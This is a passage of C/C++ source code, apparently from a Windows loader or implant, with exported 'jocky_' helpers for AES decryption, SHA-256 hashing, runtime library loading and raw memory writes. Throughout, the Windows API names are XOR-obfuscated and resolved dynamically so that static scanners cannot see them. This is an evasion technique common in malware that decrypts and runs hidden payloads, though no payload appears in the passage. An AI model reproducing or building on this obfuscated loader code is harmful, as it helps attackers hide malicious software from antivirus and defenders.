        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x13), XB(0x37), XB(0x2A), XB(0x35), XB(0x28), XB(0x2E), XB(0x11), XB(0x3F), XB(0x23)) // CryptImportKey
        fn_ik = (Fn_CryptImportKey)advs(s); ZERO_STR(s);
    }
    if (!fn_dec) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1E), XB(0x3F), XB(0x39), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E)) // CryptDecrypt
        fn_dec = (Fn_CryptDecrypt)advs(s); ZERO_STR(s);
    }
    if (!fn_dk) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1E), XB(0x3F), XB(0x29), XB(0x2E), XB(0x28), XB(0x35), XB(0x23), XB(0x11), XB(0x3F), XB(0x23)) // CryptDestroyKey
        fn_dk = (Fn_CryptDestroyKey)advs(s); ZERO_STR(s);
    }
    if (!fn_rc) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x08), XB(0x3F), XB(0x36), XB(0x3F), XB(0x3B), XB(0x29), XB(0x3F), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E)) // CryptReleaseContext
        fn_rc = (Fn_CryptReleaseContext)advs(s); ZERO_STR(s);
    }

    if (!fn_acq || !fn_ch || !fn_hd || !fn_ik || !fn_dec || !fn_dk || !fn_rc)
        return 0;

    PVOID hProv = NULL;
    if (!fn_acq(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return 0;

    BYTE blobBuf[12 + 32];
    memset(blobBuf, 0, sizeof(blobBuf));
    blobBuf[0] = 0x08;
    blobBuf[1] = 0x02;
    blobBuf[2] = 0x00;
    blobBuf[3] = 0x00;
    blobBuf[4] = 0x10;
    blobBuf[5] = 0x66;
    blobBuf[6] = 0x00;
    blobBuf[7] = 0x00;
    DWORD klen = keylen < 32 ? keylen : 32;
    blobBuf[8]  = (BYTE)(klen);
    blobBuf[9]  = (BYTE)(klen >> 8);
    blobBuf[10] = (BYTE)(klen >> 16);
    blobBuf[11] = (BYTE)(klen >> 24);
    const BYTE* kbytes = (const BYTE*)key;
    for (DWORD i = 0; i < klen; i++) blobBuf[12 + i] = kbytes[i];

    PVOID hKey = NULL;
    if (!fn_ik(hProv, blobBuf, 12 + klen, NULL, 0, &hKey)) {
        fn_rc(hProv, 0);
        return 0;
    }

    DWORD dataLen = ctlen;
    BOOL ok = fn_dec(hKey, NULL, 1, 0, (BYTE*)ciphertext, &dataLen);
    fn_dk(hKey);
    fn_rc(hProv, 0);
    return ok ? dataLen : 0;
}

extern "C" void jocky_sha256(PVOID data, DWORD size, PVOID out) {
    static Fn_CryptAcquireContextA fn_acq  = NULL;
    static Fn_CryptCreateHash      fn_ch   = NULL;
    static Fn_CryptHashData        fn_hd   = NULL;
    static Fn_CryptGetHashParam    fn_ghp  = NULL;
    static Fn_CryptDestroyHash     fn_dh   = NULL;
    static Fn_CryptReleaseContext  fn_rc   = NULL;

    if (!fn_acq) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1B), XB(0x39), XB(0x2B), XB(0x2F), XB(0x33), XB(0x28), XB(0x3F), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E), XB(0x1B)) // CryptAcquireContextA
        fn_acq = (Fn_CryptAcquireContextA)advs(s); ZERO_STR(s);
    }
    if (!fn_ch) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x12), XB(0x3B), XB(0x29), XB(0x32)) // CryptCreateHash
        fn_ch = (Fn_CryptCreateHash)advs(s); ZERO_STR(s);
    }
    if (!fn_hd) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x12), XB(0x3B), XB(0x29), XB(0x32), XB(0x1E), XB(0x3B), XB(0x2E), XB(0x3B)) // CryptHashData
        fn_hd = (Fn_CryptHashData)advs(s); ZERO_STR(s);
    }
    if (!fn_ghp) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1D), XB(0x3F), XB(0x2E), XB(0x12), XB(0x3B), XB(0x29), XB(0x32), XB(0x0A), XB(0x3B), XB(0x28), XB(0x3B), XB(0x37)) // CryptGetHashParam
        fn_ghp = (Fn_CryptGetHashParam)advs(s); ZERO_STR(s);
    }
    if (!fn_dh) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x1E), XB(0x3F), XB(0x29), XB(0x2E), XB(0x28), XB(0x35), XB(0x23), XB(0x12), XB(0x3B), XB(0x29), XB(0x32)) // CryptDestroyHash
        fn_dh = (Fn_CryptDestroyHash)advs(s); ZERO_STR(s);
    }
    if (!fn_rc) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x23), XB(0x2A), XB(0x2E), XB(0x08), XB(0x3F), XB(0x36), XB(0x3F), XB(0x3B), XB(0x29), XB(0x3F), XB(0x19), XB(0x35), XB(0x34), XB(0x2E), XB(0x3F), XB(0x22), XB(0x2E)) // CryptReleaseContext
        fn_rc = (Fn_CryptReleaseContext)advs(s); ZERO_STR(s);
    }

    if (!fn_acq || !fn_ch || !fn_hd || !fn_ghp || !fn_dh || !fn_rc) return;

    PVOID hProv = NULL;
    if (!fn_acq(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;

    PVOID hHash = NULL;
    if (!fn_ch(hProv, CALG_SHA_256, NULL, 0, &hHash)) {
        fn_rc(hProv, 0); return;
    }

    fn_hd(hHash, (const BYTE*)data, size, 0);

    DWORD hashLen = 32;
    fn_ghp(hHash, HP_HASHVAL, (BYTE*)out, &hashLen, 0);

    fn_dh(hHash);
    fn_rc(hProv, 0);
}


// ============================================================
// v2 — Utility
// ============================================================

extern "C" PVOID jocky_get_proc_addr(PVOID hModule, const char* name) {
    return GetProcAddress(hModule, name);
}

extern "C" PVOID jocky_get_module(const char* name) {
    return GetModuleHandleA(name);
}

extern "C" PVOID jocky_load_lib(const char* name) {
    static Fn_LoadLibraryA fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x16), XB(0x35), XB(0x3B), XB(0x3E), XB(0x16), XB(0x33), XB(0x38), XB(0x28), XB(0x3B), XB(0x28), XB(0x23), XB(0x1B)) // LoadLibraryA
        fn = (Fn_LoadLibraryA)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn(name);
    return NULL;
}

extern "C" DWORD jocky_get_last_err() {
    static Fn_GetLastError fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x1D), XB(0x3F), XB(0x2E), XB(0x16), XB(0x3B), XB(0x29), XB(0x2E), XB(0x1F), XB(0x28), XB(0x28), XB(0x35), XB(0x28)) // GetLastError
        fn = (Fn_GetLastError)k32s(s); ZERO_STR(s);
    }
    if (fn) return fn();
    return 0;
}


// ============================================================
// v2 — Helper
// ============================================================

extern "C" SQWORD jocky_read_long(PVOID base, DWORD offset) {
    BYTE* p = (BYTE*)base + offset;
    SQWORD val = 0;
    for (int i = 0; i < 8; i++) val |= ((SQWORD)p[i] << (i * 8));
    return val;
}

extern "C" int jocky_read_int(PVOID base, int offset) {
    return *(int*)((BYTE*)base + offset);
}

extern "C" void jocky_write_int(PVOID base, int offset, int val) {
    *(int*)((BYTE*)base + offset) = val;
}

extern "C" BYTE jocky_read_byte(PVOID base, int offset) {
    return *((BYTE*)base + offset);
}

extern "C" void jocky_write_byte(PVOID base, int offset, BYTE val) {
    *((BYTE*)base + offset) = val;
}
